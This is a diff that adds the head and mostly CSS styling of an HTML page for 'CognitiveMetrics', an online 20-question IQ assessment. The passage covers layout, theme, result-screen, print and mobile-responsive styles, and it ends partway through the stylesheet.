@@ -1,0 +1,3368 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+    <title>CognitiveMetrics | Standardized Dynamic IQ Assessment</title>
+    <meta name="description"
+        content="Professional, dynamically generated 20-question cognitive intelligence assessment measuring matrix reasoning, spatial logic, numerical patterns, and verbal analysis.">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap"
+        rel="stylesheet">
+
+    <style>
+        :root {
+            --bg-primary: #070a13;
+            --bg-secondary: #0e1424;
+            --bg-card: rgba(18, 25, 44, 0.75);
+            --bg-card-hover: rgba(28, 38, 65, 0.85);
+            --border-subtle: rgba(255, 255, 255, 0.08);
+            --border-accent: rgba(99, 102, 241, 0.4);
+            --text-main: #f1f5f9;
+            --text-muted: #94a3b8;
+            --text-dim: #64748b;
+            --accent-indigo: #6366f1;
+            --accent-cyan: #06b6d4;
+            --accent-violet: #8b5cf6;
+            --accent-emerald: #10b981;
+            --accent-amber: #f59e0b;
+            --accent-rose: #f43f5e;
+            --gradient-brand: linear-gradient(135deg, #6366f1 0%, #8b5cf6 50%, #06b6d4 100%);
+            --gradient-card: linear-gradient(145deg, rgba(25, 33, 56, 0.6) 0%, rgba(13, 19, 36, 0.8) 100%);
+            --glow-indigo: 0 0 25px rgba(99, 102, 241, 0.35);
+            --font-sans: 'Plus Jakarta Sans', system-ui, -apple-system, sans-serif;
+            --font-mono: 'JetBrains Mono', monospace;
+            --radius-sm: 8px;
+            --radius-md: 14px;
+            --radius-lg: 20px;
+            --radius-xl: 28px;
+            --transition: all 0.25s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        body {
+            background-color: var(--bg-primary);
+            color: var(--text-main);
+            font-family: var(--font-sans);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            overflow-x: hidden;
+            line-height: 1.6;
+        }
+
+        /* Ambient background gradient meshes */
+        .ambient-glow {
+            position: fixed;
+            border-radius: 50%;
+            filter: blur(120px);
+            pointer-events: none;
+            z-index: 0;
+            opacity: 0.45;
+        }
+
+        .glow-1 {
+            top: -150px;
+            left: 10%;
+            width: 500px;
+            height: 500px;
+            background: radial-gradient(circle, #4f46e5 0%, transparent 70%);
+        }
+
+        .glow-2 {
+            bottom: -100px;
+            right: 5%;
+            width: 550px;
+            height: 550px;
+            background: radial-gradient(circle, #0891b2 0%, transparent 70%);
+        }
+
+        /* Subtle grid overlay */
+        .bg-grid {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image:
+                linear-gradient(to right, rgba(255, 255, 255, 0.02) 1px, transparent 1px),
+                linear-gradient(to bottom, rgba(255, 255, 255, 0.02) 1px, transparent 1px);
+            background-size: 40px 40px;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        /* App container */
+        .app-wrapper {
+            position: relative;
+            z-index: 1;
+            width: 100%;
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 16px 20px 24px;
+            display: flex;
+            flex-direction: column;
+            flex: 1;
+            min-height: 100vh;
+        }
+
+        /* Header */
+        header.app-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 10px 20px;
+            background: rgba(14, 20, 36, 0.6);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 1px solid var(--border-subtle);
+            border-radius: var(--radius-md);
+            margin-bottom: 16px;
+        }
+
+        .brand {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            text-decoration: none;
+            color: inherit;
+        }
+
+        .brand-icon {
+            width: 32px;
+            height: 32px;
+            background: var(--gradient-brand);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: var(--glow-indigo);
+        }
+
+        .brand-icon svg {
+            width: 18px;
+            height: 18px;
+            fill: none;
+            stroke: #fff;
+            stroke-width: 2.2;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+        }
+
+        .brand-text h1 {
+            font-size: 1.05rem;
+            font-weight: 700;
+            letter-spacing: -0.02em;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .brand-badge {
+            font-size: 0.65rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.06em;
+            padding: 2px 7px;
+            border-radius: 6px;
+            background: rgba(99, 102, 241, 0.15);
+            border: 1px solid rgba(99, 102, 241, 0.3);
+            color: #a5b4fc;
+        }
+
+        .header-actions {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .btn-icon {
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid var(--border-subtle);
+            color: var(--text-muted);
+            width: 38px;
+            height: 38px;
+            border-radius: var(--radius-sm);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: var(--transition);
+        }
+
+        .btn-icon:hover {
+            color: #fff;
+            background: rgba(255, 255, 255, 0.09);
+            border-color: rgba(255, 255, 255, 0.2);
+        }
+
+        /* Screen Views */
+        .screen {
+            display: none;
+            animation: fadeIn 0.4s ease forwards;
+        }
+
+        .screen.active {
+            display: block;
+        }
+
+        #startScreen.active {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            flex: 1;
+            width: 100%;
+            padding-bottom: 40px;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* ================= START SCREEN ================= */
+        .hero-card {
+            background: var(--gradient-card);
+            border: 1px solid var(--border-subtle);
+            border-radius: var(--radius-lg);
+            padding: 40px 36px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+            backdrop-filter: blur(20px);
+            width: 100%;
+            max-width: 520px;
+            margin: auto;
+        }
+
+        .hero-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 20%;
+            right: 20%;
+            height: 2px;
+            background: var(--gradient-brand);
+            border-radius: 2px;
+            box-shadow: 0 0 20px #6366f1;
+        }
+
+        .hero-title {
+            font-size: 1.75rem;
+            font-weight: 800;
+            letter-spacing: -0.025em;
+            line-height: 1.25;
+            margin-bottom: 12px;
+            background: linear-gradient(135deg, #ffffff 0%, #cbd5e1 50%, #94a3b8 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .hero-subtitle {
+            font-size: 0.95rem;
+            color: var(--text-muted);
+            max-width: 440px;
+            margin: 0 auto 28px;
+            line-height: 1.6;
+        }
+
+        .btn-primary {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            background: var(--gradient-brand);
+            color: #ffffff;
+            font-family: inherit;
+            font-size: 0.95rem;
+            font-weight: 700;
+            padding: 12px 32px;
+            border: none;
+            border-radius: var(--radius-sm);
+            cursor: pointer;
+            transition: var(--transition);
+            box-shadow: 0 4px 18px rgba(99, 102, 241, 0.35);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 24px rgba(99, 102, 241, 0.55);
+            filter: brightness(1.1);
+        }
+
+        .btn-primary:active {
+            transform: translateY(0);
+        }
+
+
+
+        /* ================= TEST IN-PROGRESS SCREEN ================= */
+        .test-top-bar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 16px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+
+        .category-tag {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 6px 14px;
+            background: rgba(99, 102, 241, 0.12);
+            border: 1px solid rgba(99, 102, 241, 0.3);
+            border-radius: 999px;
+            font-size: 0.8rem;
+            font-weight: 700;
+            color: #c7d2fe;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+
+        .test-timer {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 6px 16px;
+            background: rgba(14, 20, 36, 0.7);
+            border: 1px solid var(--border-subtle);
+            border-radius: 999px;
+            font-family: var(--font-mono);
+            font-size: 0.95rem;
+            font-weight: 600;
+            color: var(--text-main);
+        }
+
+        .test-timer.warning {
+            color: var(--accent-rose);
+            border-color: rgba(244, 63, 94, 0.4);
+            background: rgba(244, 63, 94, 0.1);
+            animation: pulse 1.2s infinite;
+        }
+
+        /* Overall Progress Bar */
+        .progress-container {
+            margin-bottom: 24px;
+        }
+
+        .progress-meta {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 8px;
+            font-size: 0.85rem;
+            color: var(--text-muted);
+        }
+
+        .progress-meta strong {
+            color: var(--text-main);
+            font-weight: 700;
+        }
+
+        .progress-track {
+            width: 100%;
+            height: 8px;
+            background: rgba(255, 255, 255, 0.06);
+            border-radius: 999px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .progress-fill {
+            height: 100%;
+            width: 5%;
+            background: var(--gradient-brand);
+            border-radius: 999px;
+            transition: width 0.35s ease;
+            box-shadow: 0 0 12px rgba(99, 102, 241, 0.5);
+        }
+
+        /* Question Nav Strip */
+        .question-nav-strip {
+            display: flex;
+            gap: 6px;
+            overflow-x: auto;
+            padding: 4px 2px 14px;
+            margin-bottom: 20px;
+            scrollbar-width: thin;
+            scrollbar-color: rgba(255, 255, 255, 0.1) transparent;
+        }
+
+        .nav-dot {
+            flex: 0 0 auto;
+            width: 32px;
+            height: 32px;
+            border-radius: 8px;
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid var(--border-subtle);
+            color: var(--text-dim);
+            font-size: 0.8rem;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: var(--transition);
+            position: relative;
+        }
+
+        .nav-dot:hover {
+            color: #fff;
+            border-color: rgba(255, 255, 255, 0.25);
+        }
+
+        .nav-dot.current {
+            background: rgba(99, 102, 241, 0.2);
+            border-color: var(--accent-indigo);
+            color: #fff;
+            box-shadow: 0 0 10px rgba(99, 102, 241, 0.4);
+        }
+
+        .nav-dot.answered {
+            background: rgba(16, 185, 129, 0.15);
+            border-color: rgba(16, 185, 129, 0.4);
+            color: #34d399;
+        }
+
+        .nav-dot.flagged::after {
+            content: '';
+            position: absolute;
+            top: 3px;
+            right: 3px;
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: var(--accent-amber);
+            box-shadow: 0 0 4px var(--accent-amber);
+        }
+
+        /* Main Question Card */
+        .question-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border-subtle);
+            border-radius: var(--radius-xl);
+            padding: 36px;
+            backdrop-filter: blur(20px);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
+            position: relative;
+            margin-bottom: 24px;
+        }
+
+        .question-prompt {
+            font-size: 1.35rem;
+            font-weight: 700;
+            color: var(--text-main);
+            margin-bottom: 12px;
+            line-height: 1.4;
+        }
+
+        .question-subtext {
+            font-size: 0.95rem;
+            color: var(--text-muted);
+            margin-bottom: 28px;
+        }
+
+        /* Visual Media Stage (for Matrix SVG / Shapes) */
+        .visual-stage {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 32px;
+            padding: 24px;
+            background: rgba(8, 12, 22, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            border-radius: var(--radius-lg);
+            min-height: 200px;
+            position: relative;
+        }
+
+        /* Numerical Sequence Box */
+        .sequence-display {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 14px;
+            padding: 20px;
+            width: 100%;
+        }
+
+        .sequence-node {
+            font-family: var(--font-mono);
+            font-size: 1.4rem;
+            font-weight: 700;
+            padding: 14px 22px;
+            background: rgba(30, 41, 69, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: var(--radius-md);
+            color: #e2e8f0;
+            min-width: 64px;
+            text-align: center;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+        }
+
+        .sequence-node.target {
+            background: rgba(99, 102, 241, 0.2);
+            border: 2px dashed var(--accent-indigo);
+            color: #a5b4fc;
+            animation: pulse 2s infinite;
+        }
+
+        /* Options Grid */
+        .options-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 16px;
+        }
+
+
+        .option-card {
+            background: rgba(14, 20, 36, 0.5);
+            border: 1.5px solid var(--border-subtle);
+            border-radius: var(--radius-lg);
+            padding: 18px 20px;
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            cursor: pointer;
+            transition: var(--transition);
+            position: relative;
+            user-select: none;
+        }
+
+        .option-card:hover {
+            background: var(--bg-card-hover);
+            border-color: rgba(99, 102, 241, 0.4);
+            transform: translateY(-2px);
+        }
+
+        .option-card.selected {
+            background: rgba(99, 102, 241, 0.18);
+            border-color: var(--accent-indigo);
+            box-shadow: 0 0 20px rgba(99, 102, 241, 0.3);
+        }
+
+        .option-letter {
+            width: 38px;
+            height: 38px;
+            border-radius: 10px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid var(--border-subtle);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 0.95rem;
+            color: var(--text-muted);
+            transition: var(--transition);
+            flex-shrink: 0;
+        }
+
+        .option-card.selected .option-letter {
+            background: var(--accent-indigo);
+            color: #ffffff;
+            border-color: var(--accent-indigo);
+            box-shadow: 0 0 10px rgba(99, 102, 241, 0.5);
+        }
+
+        .option-content {
+            font-size: 1.05rem;
+            font-weight: 500;
+            color: var(--text-main);
+            display: flex;
+            align-items: center;
+            flex: 1;
+        }
+
+        .option-content svg {
+            max-width: 100%;
+            height: auto;
+            max-height: 100px;
+        }
+
+        /* Action Toolbar at bottom of Question */
+        .card-actions {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 14px;
+            margin-top: 10px;
+            flex-wrap: wrap;
+        }
+
+        .btn-secondary {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid var(--border-subtle);
+            color: var(--text-muted);
+            padding: 12px 24px;
+            border-radius: var(--radius-md);
+            font-family: inherit;
+            font-weight: 600;
+            font-size: 0.9rem;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            transition: var(--transition);
+        }
+
+        .btn-secondary:hover {
+            background: rgba(255, 255, 255, 0.1);
+            color: #fff;
+            border-color: rgba(255, 255, 255, 0.2);
+        }
+
+        .btn-flag.active {
+            background: rgba(245, 158, 11, 0.15);
+            border-color: rgba(245, 158, 11, 0.4);
+            color: #fbbf24;
+        }
+
+        /* ================= RESULT SCREEN ================= */
+        .result-hero {
+            background: var(--gradient-card);
+            border: 1px solid var(--border-subtle);
+            border-radius: var(--radius-xl);
+            padding: 48px 36px;
+            text-align: center;
+            position: relative;
+            margin-bottom: 32px;
+            backdrop-filter: blur(20px);
+        }
+
+        .result-iq-meter {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            margin: 20px 0 28px;
+            position: relative;
+        }
+
+        .score-circle {
+            position: relative;
+            width: 220px;
+            height: 220px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .score-svg-ring {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            transform: rotate(-90deg);
+        }
+
+        .score-svg-ring circle {
+            fill: none;
+            stroke-width: 12;
+            stroke-linecap: round;
+        }
+
+        .ring-bg {
+            stroke: rgba(255, 255, 255, 0.06);
+        }
+
+        .ring-fill {
+            stroke: url(#scoreGradient);
+            stroke-dasharray: 628;
+            stroke-dashoffset: 628;
+            transition: stroke-dashoffset 2s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+
+        .score-number {
+            font-size: 3.8rem;
+            font-weight: 800;
+            letter-spacing: -0.04em;
+            line-height: 1;
+            color: #fff;
+            font-family: var(--font-sans);
+        }
+
+        .score-label {
+            font-size: 0.8rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+            color: var(--accent-cyan);
+            margin-top: 4px;
+        }
+
+        .result-category-title {
+            font-size: 1.8rem;
+            font-weight: 800;
+            margin-bottom: 12px;
+            background: linear-gradient(135deg, #ffffff 0%, #a5b4fc 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .result-desc {
+            font-size: 1.05rem;
+            color: var(--text-muted);
+            max-width: 650px;
+            margin: 0 auto 32px;
+            line-height: 1.6;
+        }
+
+        .stats-pills-row {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 16px;
+            flex-wrap: wrap;
+            margin-bottom: 12px;
+        }
+
+        .stat-pill {
+            background: rgba(14, 20, 36, 0.7);
+            border: 1px solid var(--border-subtle);
+            border-radius: var(--radius-md);
+            padding: 14px 24px;
+            min-width: 160px;
+            text-align: center;
+        }
+
+        .stat-pill .val {
+            font-size: 1.5rem;
+            font-weight: 800;
+            color: #fff;
+        }
+
+        .stat-pill .lbl {
+            font-size: 0.75rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            color: var(--text-dim);
+            margin-top: 2px;
+        }
+
+        /* Bell curve visual */
+        .bellcurve-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border-subtle);
+            border-radius: var(--radius-xl);
+            padding: 32px;
+            margin-bottom: 32px;
+        }
+
+        .section-title {
+            font-size: 1.25rem;
+            font-weight: 700;
+            margin-bottom: 8px;
+            color: #fff;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .section-subtitle {
+            font-size: 0.85rem;
+            color: var(--text-muted);
+            margin-bottom: 24px;
+        }
+
+        .bell-svg-wrap {
+            width: 100%;
+            max-width: 760px;
+            margin: 0 auto;
+        }
+
+        .bell-svg-wrap svg {
+            width: 100%;
+            height: auto;
+            overflow: visible;
+        }
+
+        /* Cognitive Domains Radar / Breakdown */
+        .domains-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 18px;
+            margin-bottom: 32px;
+        }
+
+        .domain-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border-subtle);
+            border-radius: var(--radius-lg);
+            padding: 22px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .domain-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .domain-name {
+            font-size: 0.95rem;
+            font-weight: 700;
+            color: #fff;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .domain-score {
+            font-family: var(--font-mono);
+            font-size: 0.95rem;
+            font-weight: 700;
+            color: var(--accent-cyan);
+        }
+
+        .domain-bar-bg {
+            height: 8px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 999px;
+            overflow: hidden;
+        }
+
+        .domain-bar-fill {
+            height: 100%;
+            border-radius: 999px;
+            background: var(--gradient-brand);
+            transition: width 1.2s ease;
+        }
+
+        .domain-meta {
+            font-size: 0.78rem;
+            color: var(--text-dim);
+            line-height: 1.4;
+        }
+
+        /* Question Review Accordion */
+        .review-section {
+            background: var(--bg-card);
+            border: 1px solid var(--border-subtle);
+            border-radius: var(--radius-xl);
+            padding: 32px;
+            margin-bottom: 32px;
+        }
+
+        .review-list {
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+            margin-top: 20px;
+        }
+
+        .review-item {
+            background: rgba(14, 20, 36, 0.6);
+            border: 1px solid var(--border-subtle);
+            border-radius: var(--radius-md);
+            padding: 18px 22px;
+            transition: var(--transition);
+        }
+
+        .review-item.is-correct {
+            border-left: 4px solid var(--accent-emerald);
+        }
+
+        .review-item.is-incorrect {
+            border-left: 4px solid var(--accent-rose);
+        }
+
+        .review-top {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 12px;
+            margin-bottom: 8px;
+        }
+
+        .review-q-num {
+            font-size: 0.85rem;
+            font-weight: 700;
+            color: var(--text-muted);
+        }
+
+        .review-status-badge {
+            font-size: 0.72rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            padding: 3px 8px;
+            border-radius: 6px;
+        }
+
+        .badge-correct {
+            background: rgba(16, 185, 129, 0.15);
+            color: #34d399;
+            border: 1px solid rgba(16, 185, 129, 0.3);
+        }
+
+        .badge-incorrect {
+            background: rgba(244, 63, 94, 0.15);
+            color: #fb7185;
+            border: 1px solid rgba(244, 63, 94, 0.3);
+        }
+
+        .review-prompt {
+            font-size: 1rem;
+            font-weight: 600;
+            color: var(--text-main);
+            margin-bottom: 12px;
+        }
+
+        .review-explanation {
+            background: rgba(8, 12, 22, 0.5);
+            border-radius: var(--radius-sm);
+            padding: 12px 16px;
+            font-size: 0.85rem;
+            color: #cbd5e1;
+            border-left: 2px solid var(--accent-indigo);
+        }
+
+        /* Print / PDF Certificate Template */
+        @media print {
+            body {
+                background: #ffffff !important;
+                color: #0f172a !important;
+            }
+
+            .ambient-glow,
+            .bg-grid,
+            .app-header,
+            .card-actions,
+            .review-section,
+            .btn-primary,
+            .btn-secondary,
+            .question-nav-strip,
+            .test-top-bar,
+            .test-config-bar {
+                display: none !important;
+            }
+
+            .hero-card,
+            .result-hero,
+            .bellcurve-card,
+            .domain-card {
+                background: #ffffff !important;
+                border: 1px solid #cbd5e1 !important;
+                color: #0f172a !important;
+                box-shadow: none !important;
+            }
+
+            .score-number {
+                color: #0f172a !important;
+            }
+
+            .result-category-title {
+                -webkit-text-fill-color: #0f172a !important;
+            }
+
+            .app-wrapper {
+                max-width: 100% !important;
+                padding: 0 !important;
+            }
+        }
+
+        /* Keyboard shortcut helper */
+        .keyboard-hint {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 0.75rem;
+            color: var(--text-dim);
+            margin-top: 10px;
+        }
+
+        kbd {
+            font-family: var(--font-mono);
+            font-size: 0.7rem;
+            background: rgba(255, 255, 255, 0.08);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 4px;
+            padding: 2px 6px;
+            color: var(--text-muted);
+        }
+
+        /* ========================================================
+           FULL MOBILE RESPONSIVE DESIGN SYSTEM & MEDIA QUERIES
+        ======================================================== */
+
+        /* Root & Mobile Tap Behavior */
+        html {
+            overflow-x: hidden;
+            width: 100%;
+            -webkit-text-size-adjust: 100%;
+        }
+
+        body {
+            overflow-x: hidden;
+            width: 100%;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        button,
+        .option-card,
+        .nav-dot,
+        .btn-icon {
+            touch-action: manipulation;
+        }
+
+        /* Ambient glow containment */
+        .ambient-glow {
+            max-width: 100vw;
+            max-height: 100vh;
+        }
+
+        /* Matrix 3x3 Grid & Cells */
+        .matrix-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 74px);
+            gap: 8px;
+            padding: 12px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 14px;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            margin: 0 auto;
+            max-width: 100%;
+            box-sizing: border-box;
+            justify-content: center;
+        }
+
+        .matrix-cell {
+            width: 70px;
+            height: 70px;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 10px;
+            display: block;
+            box-sizing: border-box;
+            transition: var(--transition);
+        }
+
+        div.matrix-cell.target {
+            border: 2px dashed #6366f1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(99, 102, 241, 0.1);
+        }
+
+        div.matrix-cell.target span {
+            font-size: 1.8rem;
+            font-weight: 800;
+            color: #818cf8;
+        }
+
+        /* Spatial SVG & Net */
+        .net-svg {
+            width: 220px;
+            max-width: 100%;
+            height: auto;
+            display: block;
+            margin: 0 auto;
+        }
+
+        .spatial-ref-wrap {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .spatial-ref-label {
+            font-size: 0.8rem;
+            font-weight: 700;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+
+        /* Logic & Verbal Stage Displays */
+        .logic-formula-display {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: var(--font-mono);
+            color: #cbd5e1;
+            font-size: 1.05rem;
+            padding: 12px 18px;
+            background: rgba(30, 41, 69, 0.4);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: var(--radius-md);
+            text-align: center;
+            max-width: 100%;
+            word-break: break-word;
+            box-sizing: border-box;
+        }
+
+        .verbal-pair-display {
+            font-family: var(--font-mono);
+            font-size: 1.25rem;
+            font-weight: 700;
+            color: #38bdf8;
+            background: rgba(6, 182, 212, 0.1);
+            border: 1px solid rgba(6, 182, 212, 0.3);
+            border-radius: 12px;
+            padding: 14px 24px;
+            text-align: center;
+            max-width: 100%;
+            word-break: break-word;
+            letter-spacing: 0.04em;
+            box-sizing: border-box;
+        }
+
+        /* Navigation Action Bars */
+        .card-actions-left {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .card-actions-right {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .result-actions {
+            margin-top: 28px;
+            display: flex;
+            gap: 14px;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+
+        .review-answers-row {
+            font-size: 0.85rem;
+            color: var(--text-muted);
+            margin-bottom: 8px;
+            line-height: 1.4;
+        }
+
+        .review-sep {
+            margin: 0 4px;
+            color: var(--text-dim);
+        }
+
+        /* Hover only for pointer devices */
+        @media (hover: hover) and (pointer: fine) {
+            .btn-primary:hover {
+                transform: translateY(-2px);
+                box-shadow: 0 6px 24px rgba(99, 102, 241, 0.55);
+                filter: brightness(1.1);
+            }
+
+            .btn-secondary:hover {
+                background: rgba(255, 255, 255, 0.1);
+                color: #fff;
+                border-color: rgba(255, 255, 255, 0.2);
+            }
+
+            .option-card:hover {
+                background: var(--bg-card-hover);
+                border-color: rgba(99, 102, 241, 0.4);
+                transform: translateY(-2px);
+            }
+
+            .nav-dot:hover {
+                color: #fff;
+                border-color: rgba(255, 255, 255, 0.25);
+            }
+        }
+
+        /* Tactile Tap Feedback */
+        .btn-primary:active {
+            transform: scale(0.97);
+            filter: brightness(0.95);
+        }
+
+        .btn-secondary:active {
+            transform: scale(0.97);
+            background: rgba(255, 255, 255, 0.12);
+        }
+
+        .option-card:active {
+            transform: scale(0.985);
+        }
+
+        .nav-dot:active {
+            transform: scale(0.92);
+        }
+
+        /* Tablet Breakpoint (<= 768px) */
+        @media (max-width: 768px) {
+            .app-wrapper {
+                padding: 12px 16px 20px;
+            }
+
+            header.app-header {
+                padding: 10px 16px;
+                margin-bottom: 14px;
+            }
+
+            .hero-card {
+                padding: 32px 24px;
+                max-width: 100%;
+            }
+
+            .hero-title {
+                font-size: 1.6rem;
+            }
+
+            .options-grid {
+                grid-template-columns: 1fr;
+                gap: 12px;
+            }
+
+            .question-card {
+                padding: 24px 20px;
+                border-radius: var(--radius-lg);
+                margin-bottom: 18px;
+            }
+
+            .bellcurve-card,
+            .review-section {
+                padding: 24px 18px;
+            }
+        }
+
+        /* Mobile Breakpoint (<= 600px) */
+        @media (max-width: 600px) {
+            .app-wrapper {
+                padding: 10px 12px 18px;
+            }
+
+            header.app-header {
+                padding: 8px 12px;
+                margin-bottom: 12px;
+            }
+
+            .brand-icon {
+                width: 28px;
+                height: 28px;
+            }
+
+            .brand-text h1 {
+                font-size: 0.95rem;
+                gap: 6px;
+                flex-wrap: wrap;
+            }
+
+            .brand-badge {
+                font-size: 0.6rem;
+                padding: 2px 6px;
+            }
+
+            .btn-icon {
+                width: 36px;
+                height: 36px;
+            }
+
+            /* Start Screen */
+            #startScreen.active {
+                padding-bottom: 20px;
+            }
+
+            .hero-card {
+                padding: 26px 18px;
+                border-radius: 18px;
+            }
+
+            .hero-title {
+                font-size: 1.45rem;
+                margin-bottom: 10px;
+            }
+
+            .hero-subtitle {
+                font-size: 0.88rem;
+                margin-bottom: 22px;
+                line-height: 1.5;
+            }
+
+            #startTestBtn {
+                width: 100%;
+                min-height: 48px;
+                font-size: 1rem;
+                padding: 13px 20px;
+            }
+
+            /* Test Top Bar */
+            .test-top-bar {
+                gap: 8px;
+                margin-bottom: 12px;
+            }
+
+            .category-tag {
+                font-size: 0.72rem;
+                padding: 5px 10px;
+                gap: 6px;
+                max-width: 65%;
+            }
+
+            .test-timer {
+                font-size: 0.85rem;
+                padding: 5px 12px;
+                gap: 6px;
+            }
+
+            /* Progress */
+            .progress-container {
+                margin-bottom: 12px;
+            }
+
+            .progress-meta {
+                font-size: 0.78rem;
+                margin-bottom: 6px;
+            }
+
+            .progress-track {
+                height: 6px;
+            }
+
+            /* Question Nav Strip */
+            .question-nav-strip {
+                gap: 5px;
+                padding: 4px 2px 8px;
+                margin-bottom: 14px;
+            }
+
+            .nav-dot {
+                width: 30px;
+                height: 30px;
+                font-size: 0.75rem;
+                border-radius: 7px;
+            }
+
+            /* Question Card */
+            .question-card {
+                padding: 18px 14px;
+                border-radius: 16px;
+                margin-bottom: 14px;
+            }
+
+            .question-prompt {
+                font-size: 1.1rem;
+                line-height: 1.35;
+                margin-bottom: 8px;
+            }
+
+            .question-subtext {
+                font-size: 0.82rem;
+                line-height: 1.4;
+                margin-bottom: 16px;
+            }
+
+            .visual-stage {
+                padding: 14px 8px;
+                margin-bottom: 18px;
+                min-height: 140px;
+                border-radius: 12px;
+            }
+
+            /* Numerical Sequence */
